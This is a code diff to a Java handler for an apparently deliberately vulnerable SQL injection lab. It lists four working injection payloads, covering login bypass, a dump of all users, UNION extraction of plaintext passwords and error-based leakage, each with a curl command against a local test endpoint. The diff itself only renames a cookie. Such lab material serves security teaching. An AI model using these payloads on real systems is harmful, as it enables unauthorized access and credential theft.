@@ -97,16 +97,16 @@ public class SqlInjectionHandler implements IRouteHandler {
         String exploits = TemplateEngine.exploitBox(new String[][]{
             {"Dump all users", "' OR '1'='1",
              "The WHERE clause becomes always-true. Returns every row in the table.", "username",
-             "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"username=' OR '1'='1\""},
+             "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"username=' OR '1'='1\""},
             {"Login bypass", "admin'--",
              "The -- comment strips the password check. Logs in as admin with no password.", "username",
-             "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"username=admin'--\""},
+             "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"username=admin'--\""},
             {"UNION extraction", "' UNION SELECT id, username, password, role FROM users--",
              "Appends a second SELECT. Returns usernames and plaintext passwords.", "username",
-             "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"username=' UNION SELECT id,username,password,role FROM users--\""},
+             "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"username=' UNION SELECT id,username,password,role FROM users--\""},
             {"Error-based enumeration", "' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--",
              "Forces the DB to cast a string to int, leaking the value in the error message.", "username",
-             "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"username=' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--\""},
+             "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"username=' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--\""},
         });
 
         String vulnForm = """
